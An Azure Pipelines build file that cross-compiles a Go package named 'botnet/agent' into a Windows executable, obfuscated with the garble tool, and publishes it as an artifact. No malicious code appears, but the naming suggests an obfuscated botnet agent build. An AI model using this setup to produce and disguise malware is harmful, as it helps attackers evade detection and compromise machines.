pool:
  vmImage: ubuntu-latest

container: 
  image: golang:1.18.1-buster
  endpoint: DockerHub - Han_Yang_Kuo

variables:
  GOPATH: '$(Pipeline.Workspace)/go' # Go workspace path
  GOBIN:  '$(GOPATH)/bin' # Go binaries path
  # GOROOT: '/usr/local/go1.11' # Go installation path

steps:
  - checkout: self
    path: go/src/botnet
  - script: |
      export PATH=$(GOPATH)/bin:$PATH
      go install mvdan.cc/garble@latest

      go env -w GOOS=windows
      go env -w GOARCH=amd64
      echo ** show go environment **
      go env
      go mod tidy
      
      echo ** build go execuable **
      garble build -o agent.exe com.young/botnet/agent
      
  - task: CopyFiles@2
    inputs:
      Contents: |
        *.exe
      TargetFolder: '$(Build.ArtifactStagingDirectory)'
  - task: PublishBuildArtifacts@1
    inputs:
      artifactName: agent
  

